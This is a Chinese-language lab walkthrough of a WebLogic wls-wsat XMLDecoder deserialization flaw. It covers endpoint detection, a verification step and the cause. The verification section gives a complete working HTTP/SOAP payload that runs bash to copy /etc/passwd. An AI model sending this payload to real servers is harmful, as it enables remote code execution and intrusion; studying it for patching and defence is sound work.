#weblogic漏洞利用过程 
##一、漏洞检测 
访问`http://192.168.247.143/wls-wsat/coordinatorPortType` 
![Alt text](/img/weblogic-1.png) 
访问`http://192.168.247.143/wls-wsat/coordinatorPortType11` 
![Alt text](/img/weblogic-2.png) 
##二、漏洞验证 
访问`http://192.168.247.143/wls-wsat/coordinatorPortType`并用Burpsuite抓包 
![Alt text](/img/weblogic-3.png) 

发送到repeter，填写payload，在这里我们执行命令为cp /etc/passwd /tmp/weblogic-passwd，即可/etc/passwd 复制到 /tmp/weblogic-passwd

`POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.247.143:7001
Accept-Encoding: identity
Content-Length: 691
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Referer: http://www.baidu.com
Cache-Control: max-age=0
Content-Type: text/xml
X-Forwarded-For: 72.11.140.178
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  <void class="java.lang.ProcessBuilder">
			<array class="java.lang.String" length="3">
			  <void index="0">
				<string>/bin/bash</string>
			  </void>
			  <void index="1">
				<string>-c</string>
				</void>
			  <void index="2">
				<string>cp /etc/passwd /tmp/weblogic_passwd</string>
			  </void>
			</array>
		  <void method="start"/></void>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>`
![Alt text](/img/weblogic-4.png)
点击go，查看主机的/tmp 目录，发现已经生成weblogic-passwd 
![Alt text](/img/weblogic-5.png)

 ##三、漏洞形成原因 
 此次被利用的漏洞源自WebLogic自带的一个wls-wsat.war应用包（Web Services Atomic Transactions组件），该组件存在RCE（远程代码执行）漏洞，允许使用JDK自身的XMLDecoder进行反序列化漏洞攻击，下载并运行比特币的挖矿程序。但Java XMLDecoder反序列化漏洞也并不是这两年才出来，早在2013年就已经爆出来了，2015年爆出来的CVE-2015-4852也并不是唯一的反序列化漏洞。 Github上有一个项目Java-Deserialization-Cheat-Sheet（https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet），总结了几乎所有的Java反序列化漏洞。